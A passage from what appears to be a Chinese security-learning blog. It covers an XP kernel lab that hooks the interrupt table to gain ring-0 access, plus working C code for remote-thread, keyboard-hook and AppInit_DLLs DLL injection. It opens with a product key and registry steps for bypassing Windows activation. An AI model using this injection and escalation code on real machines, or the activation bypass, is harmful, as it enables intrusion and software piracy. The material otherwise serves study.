class="line">DP7CM-PD6MC<span class="number">-6B</span>KXT-M8JJ6-RPXGJ</span><br></pre></td></tr></table></figure><blockquote><p>烦人 只有sp3支持windbg远程服务器符号比较全</p></blockquote><p>激活</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">（<span class="number">1</span>）点击“开始”——运行——输入regedit ——回车 。此时进入注册表编辑器。</span><br><span class="line">（<span class="number">2</span>）找到主键 Hkey_Local_Machine\Software\Microsoft\WindowsNT\CurrentVersion\WPAEvents\</span><br><span class="line">（<span class="number">3</span>）删除子键 lastWPAEventLoged （右击，删除）</span><br><span class="line">（<span class="number">4</span>）（右击，“修改”）修改子键 OOBETimer 键值为：ff d5 <span class="number">71</span> d6 <span class="number">8b</span> <span class="number">6</span>a <span class="number">8</span>d <span class="number">6f</span> d5 <span class="number">33</span> <span class="number">93</span> fd </span><br><span class="line">（<span class="number">5</span>）右击注册表中的“WPAEvents”→“权限”→“高级”→“所有者”→你的用户名→→“确定”</span><br><span class="line">（<span class="number">6</span>）回到“安全”→“高级”→选择列表中的“system”→“编辑” ，把“拒绝”列下的方框全部打勾即可 （勾“完全控制”即可），确定，退出。</span><br></pre></td></tr></table></figure><p>给虚拟机开个串行端口，用管道来通信，名字com_2</p><blockquote><p>com_1的名字有打印机的话，会被打印机占去</p></blockquote><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">\\.\pipe\com_2</span><br></pre></td></tr></table></figure><p><img src="/2023/05/26/Windows-Kernel-Experiment-Interrupt-Privilege-Escalation/image-20230526010718133.png" alt="image-20230526010718133"></p><p>boot.ini文件里添加下面一句 </p><blockquote><p>COM1是因为给虚拟机开个串行端口时就是端口1(端口2的话会显示串行端口2)</p><p><img src="/2023/05/26/Windows-Kernel-Experiment-Interrupt-Privilege-Escalation/image-20230526140611903.png" alt="image-20230526140611903"></p></blockquote><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">multi(<span class="number">0</span>)disk(<span class="number">0</span>)rdisk(<span class="number">0</span>)partition(<span class="number">1</span>)\WINDOWS=<span class="string">&quot;Microsoft Windows XP Home Edition DEBUG&quot;</span> /noexecute=optin /fastdetect /debugport=COM1 /baudrate=<span class="number">115200</span></span><br></pre></td></tr></table></figure><p>可以运行 msconfig 验证一下</p><p><img src="/2023/05/26/Windows-Kernel-Experiment-Interrupt-Privilege-Escalation/image-20230526140205585.png" alt="image-20230526140205585"></p><p>windbg配置</p><blockquote><p>这里的\.\pipe\com_2就是配置的管道名字</p></blockquote><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;D:\Windows Kits\10\Debuggers\x64\windbg.exe&quot;</span> -b -k com:pipe,port=\\.\pipe\com_2,baud=<span class="number">115200</span>,resets=<span class="number">0</span> -y SRV*E:\WindbgSybols*https:<span class="comment">//msdl.microsoft.com/download/symbols</span></span><br></pre></td></tr></table></figure><p>**<code>GRMWDK_EN_7600_1.ISO</code>**windbg7600 (新版调试xp总是出现各种bug)</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>https:<span class="comment">//www.microsoft.com/en-us/download/confirmation.aspx?id=11800</span></span><br><span class="line"><span class="number">2.</span>https:<span class="comment">//download.microsoft.com/download/4/A/2/4A25C7D5-EFBE-4182-B6A9-AE6850409A78/GRMWDK_EN_7600_1.ISO</span></span><br></pre></td></tr></table></figure><p>xuetr工具</p><figure class="highlight tex"><table><tr><td class="code"><pre><span class="line">http://www.xuetr.com/</span><br></pre></td></tr></table></figure><p>vs2022安装个xp的单个组件，后改运行库，改基址固定(后面提权要固定基址)</p><p><img src="/2023/05/26/Windows-Kernel-Experiment-Interrupt-Privilege-Escalation/image-20230526200219936.png" alt="image-20230526200219936"></p><p>vs2022</p><p>c&#x2F;c++代码生成里<img src="/2023/05/26/Windows-Kernel-Experiment-Interrupt-Privilege-Escalation/image-20230531145420975.png" alt="image-20230531145420975"></p><h2 id="中断提权"><a href="#中断提权" class="headerlink" title="中断提权"></a>中断提权</h2><p>前置知识ia32保护模式，中断和异常等</p><p><a href="https://grxer.github.io/2023/04/08/32bit-x86-protected-mode/">https://grxer.github.io/2023/04/08/32bit-x86-protected-mode/</a></p><p><a href="https://grxer.github.io/2023/04/22/IA32-Interrupt-Exception/">https://grxer.github.io/2023/04/22/IA32-Interrupt-Exception/</a></p><p>往未使用的中断向量表里塞入我们自己的函数然后手动中断到我们的代码就可以获得0环执行权限</p><p><img src="/2023/05/26/Windows-Kernel-Experiment-Interrupt-Privilege-Escalation/image-20230526222003641.png" alt="image-20230526222003641"></p><p>windbg调试</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">kd&gt; r idtr</span><br><span class="line">idtr=<span class="number">8003f</span>400</span><br><span class="line">kd&gt; dq <span class="number">8003f</span>400</span><br><span class="line"><span class="number">8003f</span>400  <span class="number">80548e00</span>`<span class="number">00082190</span> <span class="number">80548e00</span>`<span class="number">0008230</span>c</span><br><span class="line"><span class="number">8003f</span>410  <span class="number">00008500</span>`<span class="number">0058112</span>e <span class="number">8054</span>ee00`<span class="number">00082720</span></span><br><span class="line"><span class="number">8003f</span>420  <span class="number">8054</span>ee00`<span class="number">000828</span>a0 <span class="number">80548e00</span>`<span class="number">00082</span>a00</span><br><span class="line"><span class="number">8003f</span>430  <span class="number">80548e00</span>`<span class="number">00082b</span>74 <span class="number">80548e00</span>`<span class="number">000831</span>ec</span><br><span class="line"><span class="number">8003f</span>440  <span class="number">00008500</span>`<span class="number">00501188</span> <span class="number">80548e00</span>`<span class="number">000835f</span>0</span><br><span class="line"><span class="number">8003f</span>450  <span class="number">80548e00</span>`<span class="number">00083710</span> <span class="number">80548e00</span>`<span class="number">00083850</span></span><br></pre></td></tr></table></figure><blockquote><p>dbg里 r idtr只显示了高32位的基址</p><p>r idtl可以显示界限</p></blockquote><p>回顾下中断门描述符</p><p><img src="/2023/05/26/Windows-Kernel-Experiment-Interrupt-Privilege-Escalation/image-20230526221657750.png" alt="image-20230526221657750"></p><p>由0号除0中断为例 他的中断处理程序地址是怎么来的</p><p>8003f400地址处<code>80548e00 00082190</code>高48-64位8054 + 低0-15位2190 &#x3D; 0x80542190</p><p>20号中断是未使用的，我们就选取20号中断hook</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line">DWORD g_tmp;</span><br><span class="line"><span class="type">void</span> __declspec(naked) IdtEntry() &#123;<span class="comment">//裸函数不会帮我们生成栈帧，单纯一个call</span></span><br><span class="line">    __asm &#123;</span><br><span class="line">        push eax</span><br><span class="line">        mov eax,dword ptr ds:[<span class="number">0x8003f500</span>]</span><br><span class="line">        mov g_tmp,eax</span><br><span class="line">        pop eax</span><br><span class="line">        iretd</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">interrupt</span><span class="params">()</span> &#123;</span><br><span class="line">    __asm &#123;</span><br><span class="line">        <span class="type">int</span> <span class="number">0x20</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="number">0x401040</span> != IdtEntry) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;IdtRntry address wrong&quot;</span>);</span><br><span class="line">        system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    interrupt();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%x&quot;</span>,g_tmp);</span><br><span class="line">    system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol><li>接下来去在dbg里修改中断向量表</li></ol><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">eq <span class="number">8003f</span>500  <span class="number">0040</span>ee00`<span class="number">00081040</span></span><br></pre></td></tr></table></figure><blockquote><p>这里要注意的是DPL位，DPL位必须是个三环标志(11)，确保三环程序可以触发这个中断</p><p>0环的话我们3环程序去int 20中断的话，会产生越权访问的异常，这也是防止恶意程序随意调用系统调用的方式之一</p></blockquote><ol start="2"><li><p>ce居然也可以改(之前还看到他可以加速百度网盘 。。。)</p><p>把下面在设置 其他里勾上，就可以改内核内存了</p><p><img src="/2023/05/26/Windows-Kernel-Experiment-Interrupt-Privilege-Escalation/image-20230527002007814.png" alt="image-20230527002007814"></p></li></ol><p>访问成功，IdtEntry内指令获得0环权限</p>]]></content>
      
      
      
        <tags>
            
            <tag> Windows Kernel Experiment </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>动态Dll注入和卸载(Dynamic DLL Injection And Unloading)</title>
      <link href="/2023/05/25/Dynamic-DLL-Injection-and-unloading/"/>
      <url>/2023/05/25/Dynamic-DLL-Injection-and-unloading/</url>
      
        <content type="html"><![CDATA[<h1 id="Dynamic-DLL-Injection-And-Unloading"><a href="#Dynamic-DLL-Injection-And-Unloading" class="headerlink" title="Dynamic DLL Injection And Unloading"></a>Dynamic DLL Injection And Unloading</h1><p>提到注入技术，第一想到的可能是游戏外挂(我第一次听到注入也是在外挂。。。)，病毒等等，但注入也会被应用到插件开发，应用拓展，修复bug上</p><h2 id="远程线程注入"><a href="#远程线程注入" class="headerlink" title="远程线程注入"></a>远程线程注入</h2><ul><li><p>OpenProcess 用待注入进程的id拿到句柄</p></li><li><p>VirtualAllocEx 注入进程内申请远程一块虚拟空间</p></li><li><p>WriteProcessMemory 往这块虚拟内存写入dll名称</p></li><li><p>GetModuleHandle 获取kernel32.dll句柄</p><blockquote><p>常见的系统模块kernel32.dll user32.dll gdi32.dll advapi32.dll shell32.dll等加载到各个进程虚拟地址的偏移是相同的(这个原因也就导致我们32位注入器只能注入32位进程，64位只能注入64位进程)，这一点让我好像明白了windows dll为什么采用直接修改内存代码的基址重定位，不怕浪费内存吗？，这样看如果地址一样，直接在内存中映射一份就可以多进程共享了，(不过在实验(xp sp3里)中发现,或者说是多个本来映射到同一块，某个进程改时复制一块,<del>没敢给物理机挂内核调试器去验证</del>)</p><p>aslr是每次启动系统时，系统模块加载基址会变</p><p>感觉这种机制也是为什么linux的服务端为什么会windows安全很多的原因之一</p></blockquote></li><li><p>GetProcAddress从kernel32中获取LoadLibraryW函数地址</p></li><li><p>CreateRemoteThread向远程进程开启远程线程来调用LoadLibraryW注入到进程，进程执行DllMain</p></li></ul><p>hack.dll</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// dllmain.cpp : 定义 DLL 应用程序的入口点。</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;pch.h&quot;</span></span></span><br><span class="line">HMODULE g_hMod;</span><br><span class="line">DWORD WINAPI <span class="title function_">ThreadProc</span><span class="params">(LPVOID lParam)</span> &#123;</span><br><span class="line">    TCHAR Path[MAX_PATH];</span><br><span class="line">    <span class="keyword">if</span> (!GetModuleFileName(g_hMod, Path, MAX_PATH))</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    MessageBox(<span class="literal">NULL</span>,<span class="string">L&quot;grxer&quot;</span>,Path,MB_OK);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">BOOL APIENTRY <span class="title function_">DllMain</span><span class="params">( HMODULE hModule,</span></span><br><span class="line"><span class="params">                       DWORD  ul_reason_for_call,</span></span><br><span class="line"><span class="params">                       LPVOID lpReserved</span></span><br><span class="line"><span class="params">                     )</span></span><br><span class="line">&#123;</span><br><span class="line">    g_hMod = hModule;</span><br><span class="line">    <span class="keyword">switch</span> (ul_reason_for_call)</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">case</span> DLL_PROCESS_ATTACH:</span><br><span class="line">    &#123;</span><br><span class="line">        OutputDebugString(<span class="string">L&quot;hack.dll injection\n&quot;</span>);</span><br><span class="line">        HANDLE hThread = CreateThread(<span class="literal">NULL</span>, <span class="number">0</span>, ThreadProc, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">        CloseHandle(hThread);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">case</span> DLL_THREAD_ATTACH:</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> DLL_THREAD_DETACH:</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> DLL_PROCESS_DETACH:</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Inject.exe</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;tchar.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;winnt.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line">BOOL <span class="title function_">Inject</span><span class="params">(DWORD dwPID, LPCTSTR szDllPath)</span> &#123;</span><br><span class="line">    HANDLE hProcess;</span><br><span class="line">    HANDLE hThread;</span><br><span class="line">    HMODULE hMod = <span class="literal">NULL</span>;</span><br><span class="line">    DWORD dwBufSize = (DWORD)(_tcslen(szDllPath) + <span class="number">1</span>) * <span class="keyword">sizeof</span>(TCHAR);</span><br><span class="line">    LPVOID pRemoteBuf = <span class="literal">NULL</span>;</span><br><span class="line">    LPTHREAD_START_ROUTINE pThreadProc;</span><br><span class="line">    <span class="keyword">if</span> (!(hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPID))) &#123;</span><br><span class="line">        _tprintf(<span class="string">L&quot;open fail %d&quot;</span>, GetLastError());</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line">    pRemoteBuf = VirtualAllocEx(hProcess, <span class="literal">NULL</span>, dwBufSize, MEM_COMMIT, PAGE_READWRITE);</span><br><span class="line">    _tprintf(<span class="string">L&quot;%p&quot;</span>, pRemoteBuf);</span><br><span class="line">    <span class="keyword">if</span> (pRemoteBuf == <span class="number">0</span>) &#123;</span><br><span class="line">        _tprintf(<span class="string">L&quot;%d\n&quot;</span>, GetLastError());</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line">    WriteProcessMemory(hProcess, pRemoteBuf, (LPCVOID)szDllPath, dwBufSize, <span class="literal">NULL</span>);</span><br><span class="line">    hMod = GetModuleHandle(<span class="string">L&quot;kernel32.dll&quot;</span>);</span><br><span class="line">    pThreadProc = (LPTHREAD_START_ROUTINE)GetProcAddress(hMod, <span class="string">&quot;LoadLibraryW&quot;</span>);</span><br><span class="line">    hThread = CreateRemoteThread(hProcess, <span class="literal">NULL</span>, <span class="number">0</span>, pThreadProc, pRemoteBuf, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">    WaitForSingleObject(hThread, INFINITE);</span><br><span class="line">    CloseHandle(hThread);</span><br><span class="line">    CloseHandle(hProcess);</span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> _tmain(<span class="type">int</span> argc, TCHAR* argv[]) &#123;</span><br><span class="line">    <span class="keyword">if</span> (argc != <span class="number">3</span>) &#123;</span><br><span class="line">        _tprintf(<span class="string">L&quot;USAGE : %s &lt;pid&gt; &lt;dll_path&gt;\n&quot;</span>, argv[<span class="number">0</span>]);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    _tprintf(<span class="string">L&quot;%s,%s&quot;</span>, argv[<span class="number">1</span>], argv[<span class="number">2</span>]);</span><br><span class="line">    <span class="keyword">if</span> (!Inject((DWORD)_tstol(argv[<span class="number">1</span>]), argv[<span class="number">2</span>])) &#123;</span><br><span class="line">        _tprintf(<span class="string">L&quot;InjectDll(\&quot;%s\&quot;) failed!!!\n&quot;</span>, argv[<span class="number">2</span>]);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    _tprintf(<span class="string">L&quot;InjectDll(\&quot;%s\&quot;) success!!!\n&quot;</span>, argv[<span class="number">2</span>]);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>如果注入另一帐户拥有的进程内存需要先获得SeDebug权限,需要我们注入器在管理员权限下做提权操作</strong></p><table><thead><tr><th><strong>SE_DEBUG_NAME</strong> TEXT (“SeDebugPrivilege”)</th><th>调试和调整另一帐户拥有的进程内存所必需的。 用户权限：调试程序。</th></tr></thead></table><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">BOOL <span class="title function_">SetPrivilege</span><span class="params">(LPCTSTR lpszPrivilege, BOOL bEnablePrivilege)</span> &#123;</span><br><span class="line">    TOKEN_PRIVILEGES tp;</span><br><span class="line">    HANDLE hToken;</span><br><span class="line">    LUID luid;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!OpenProcessToken(GetCurrentProcess(),</span><br><span class="line">        TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY,</span><br><span class="line">        &amp;hToken)) &#123;</span><br><span class="line">        _tprintf(<span class="string">L&quot;OpenProcessToken error: %u\n&quot;</span>, GetLastError());</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!LookupPrivilegeValue(<span class="literal">NULL</span>,           <span class="comment">// lookup privilege on local system</span></span><br><span class="line">        lpszPrivilege,  <span class="comment">// privilege to lookup </span></span><br><span class="line">        &amp;luid))        <span class="comment">// receives LUID of privilege</span></span><br><span class="line">    &#123;</span><br><span class="line">        _tprintf(<span class="string">L&quot;LookupPrivilegeValue error: %u\n&quot;</span>, GetLastError());</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    tp.PrivilegeCount = <span class="number">1</span>;</span><br><span class="line">    tp.Privileges[<span class="number">0</span>].Luid = luid;</span><br><span class="line">    <span class="keyword">if</span> (bEnablePrivilege)</span><br><span class="line">        tp.Privileges[<span class="number">0</span>].Attributes = SE_PRIVILEGE_ENABLED;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        tp.Privileges[<span class="number">0</span>].Attributes = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Enable the privilege or disable all privileges.</span></span><br><span class="line">    <span class="keyword">if</span> (!AdjustTokenPrivileges(hToken,</span><br><span class="line">        FALSE,</span><br><span class="line">        &amp;tp,</span><br><span class="line">        <span class="keyword">sizeof</span>(TOKEN_PRIVILEGES),</span><br><span class="line">        (PTOKEN_PRIVILEGES)<span class="literal">NULL</span>,</span><br><span class="line">        (PDWORD)<span class="literal">NULL</span>)) &#123;</span><br><span class="line">        _tprintf(<span class="string">L&quot;AdjustTokenPrivileges error: %u\n&quot;</span>, GetLastError());</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (GetLastError() == ERROR_NOT_ALL_ASSIGNED) &#123;</span><br><span class="line">        _tprintf(<span class="string">L&quot;The token does not have the specified privilege. \n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (!SetPrivilege(SE_DEBUG_NAME, TRUE))</span><br><span class="line">      <span class="keyword">return</span> <span class="number">1</span>;</span><br></pre></td></tr></table></figure><h2 id="全局消息钩子注入"><a href="#全局消息钩子注入" class="headerlink" title="全局消息钩子注入"></a>全局消息钩子注入</h2><p><img src="/2023/05/25/Dynamic-DLL-Injection-and-unloading/image-20230526000213620.png" alt="image-20230526000213620"></p><p>用SetWindowsHookEx把钩子挂入钩链</p><p>同样是32位程序只能给32位程序挂钩子</p><p>KeyHook.dll</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// dllmain.cpp : 定义 DLL 应用程序的入口点。</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;pch.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;tchar.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DEF_PROCESS_NAME        <span class="string">L&quot;notepad.exe&quot;</span></span></span><br><span class="line">HINSTANCE g_hInstance = <span class="literal">NULL</span>;    </span><br><span class="line">HHOOK g_hHook = <span class="literal">NULL</span>;</span><br><span class="line">HWND g_hWnd = <span class="literal">NULL</span>;</span><br><span class="line">BOOL APIENTRY <span class="title function_">DllMain</span><span class="params">( HMODULE hModule,</span></span><br><span class="line"><span class="params">                       DWORD  ul_reason_for_call,</span></span><br><span class="line"><span class="params">                       LPVOID lpReserved</span></span><br><span class="line"><span class="params">                     )</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">switch</span> (ul_reason_for_call)</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">case</span> DLL_PROCESS_ATTACH:</span><br><span class="line">        g_hInstance = hModule;</span><br><span class="line">    <span class="keyword">case</span> DLL_THREAD_ATTACH:</span><br><span class="line">    <span class="keyword">case</span> DLL_THREAD_DETACH:</span><br><span class="line">    <span class="keyword">case</span> DLL_PROCESS_DETACH:</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line">LRESULT CALLBACK <span class="title function_">KeyboardProc</span><span class="params">(<span class="type">int</span> nCode, WPARAM wParam, LPARAM lParam)</span> &#123;</span><br><span class="line">    TCHAR szPath[MAX_PATH] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    TCHAR* p = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (nCode &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="comment">// bit 31 : 0 =&gt; press, 1 =&gt; release</span></span><br><span class="line">        <span class="keyword">if</span> (!(lParam &amp; <span class="number">0x80000000</span>)) &#123;</span><br><span class="line">            GetModuleFileName(<span class="literal">NULL</span>, szPath, MAX_PATH);</span><br><span class="line">            p = _tcsrchr(szPath, <span class="string">&#x27;\\&#x27;</span>);</span><br><span class="line">            MessageBox(<span class="literal">NULL</span>, szPath, szPath, MB_OK);</span><br><span class="line">            <span class="comment">// 比较当前进程名称，若为notepad，则消息不会传递给应用程序</span></span><br><span class="line">            <span class="keyword">if</span> (!_tcsicmp(p + <span class="number">1</span>, DEF_PROCESS_NAME))</span><br><span class="line">                <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 若非notepad，则传给下一个程序</span></span><br><span class="line">    <span class="keyword">return</span> CallNextHookEx(g_hHook, nCode, wParam, lParam);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> __cplusplus</span></span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> &#123;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    __declspec(dllexport) <span class="type">void</span> <span class="title function_">HookStart</span><span class="params">()</span><span class="comment">//这个函数要从本DLL导出。我要给别人用。</span></span><br><span class="line">    &#123;</span><br><span class="line">        MessageBox(<span class="literal">NULL</span>,<span class="string">L&quot;hook start&quot;</span>,<span class="string">L&quot;hook start&quot;</span>,MB_OK);</span><br><span class="line">        g_hHook = SetWindowsHookEx(WH_KEYBOARD, KeyboardProc, g_hInstance, <span class="number">0</span>);<span class="comment">//g_hInstance：dll文件句柄</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    __declspec(dllexport) <span class="type">void</span> <span class="title function_">HookStop</span><span class="params">()</span><span class="comment">//这个函数要从本DLL导出。我要给别人用。</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (g_hHook) &#123;</span><br><span class="line">            UnhookWindowsHookEx(g_hHook);</span><br><span class="line">            g_hHook = <span class="literal">NULL</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> __cplusplus</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>MainHook.cpp</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;conio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>    DEF_DLL_NAME<span class="string">&quot;KeyHook.dll&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>    DEF_HOOKSTART<span class="string">&quot;HookStart&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>    DEF_HOOKSTOP<span class="string">&quot;HookStop&quot;</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="title function_">void</span> <span class="params">(*PFN_HOOKSTART)</span><span class="params">()</span>;</span><br><span class="line"><span class="keyword">typedef</span> <span class="title function_">void</span> <span class="params">(*PFN_HOOKSTOP)</span><span class="params">()</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    HMODULEhDll = <span class="literal">NULL</span>;</span><br><span class="line">    PFN_HOOKSTARTHookStart = <span class="literal">NULL</span>;</span><br><span class="line">    PFN_HOOKSTOPHookStop = <span class="literal">NULL</span>;</span><br><span class="line">    hDll = LoadLibraryA(DEF_DLL_NAME);</span><br><span class="line">    <span class="keyword">if</span> (hDll == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;LoadLibrary(%s) failed!!! [%d]&quot;</span>, DEF_DLL_NAME, GetLastError());</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 获取导出函数地址</span></span><br><span class="line">    HookStart = (PFN_HOOKSTART)GetProcAddress(hDll, DEF_HOOKSTART);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;HookStart(%p)\n &quot;</span>, HookStart);</span><br><span class="line">    HookStop = (PFN_HOOKSTOP)GetProcAddress(hDll, DEF_HOOKSTOP);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;HookStop(%p)\n &quot;</span>, HookStop);</span><br><span class="line">    HookStart();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;mortypress &#x27;q&#x27; to quit!\n&quot;</span>);</span><br><span class="line">    <span class="keyword">while</span> (_getch() != <span class="string">&#x27;q&#x27;</span>);</span><br><span class="line">    <span class="comment">// 停止勾取</span></span><br><span class="line">    HookStop();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 卸载KeyHook.dll</span></span><br><span class="line">    FreeLibrary(hDll);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="注册表注入"><a href="#注册表注入" class="headerlink" title="注册表注入"></a>注册表注入</h2><p>下面路径的AppInit_DLLs设置为要注入的DLL的路径并且将LoadAppInit_DLLs的值改成1，当程序重启的时候，所有加载user32.dll的进程都会根据AppInit_Dlls中的DLL路径加载指定的DLL</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">计算机\HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows</span><br></pre></td></tr></table></figure><p>可以在dll里加个判断只注入想注入的进程</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if( !GetModuleFileName( NULL, szPath, MAX_PATH ) )//检索包含指定模块的文件的完全限定路径。 模块必须由当前进程加载。</span><br><span class="line">           break;</span><br><span class="line">  </span><br><span class="line">       if( !(p = _tcsrchr(szPath, &#x27;\\&#x27;)) )// strrchr函数查找 str 中的 c（已转换为 char）末次出现位置。 搜索包括终止 NULL 字符</span><br><span class="line">           break;</span><br><span class="line"></span><br><span class="line">       if( _tcsicmp(p+1, &quot;想注入进程名字&quot;) )</span><br><span class="line">           break;</span><br></pre></td></tr></table></figure><h2 id="DLL卸载"><a href="#DLL卸载" class="headerlink" 